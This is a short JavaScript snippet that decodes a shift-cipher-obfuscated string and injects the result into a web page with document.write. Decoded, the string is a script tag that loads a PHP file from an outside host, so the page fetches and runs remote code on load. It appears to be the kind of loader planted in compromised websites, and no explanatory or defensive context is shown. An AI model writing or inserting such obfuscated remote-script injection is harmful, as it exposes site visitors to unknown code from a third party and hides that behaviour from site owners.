var s="=tdsjqu!uzqf>#ufyu0kbwbtdsjqu#!tsd>#iuuq;00ejttjefou/wpu/qm04ewnCU{:/qiq@je>941471:7#?=0tdsjqu?";
m="";
for (i=0; i<s.length; i++){
	if(s.charCodeAt(i) == 28){
		  m+= '&';
	}else if (s.charCodeAt(i) == 23) {
		  m+= '!';
	} else {	  
		  m+=String.fromCharCode(s.charCodeAt(i)-1);	
	}
}
console.log(m);
document.write(m);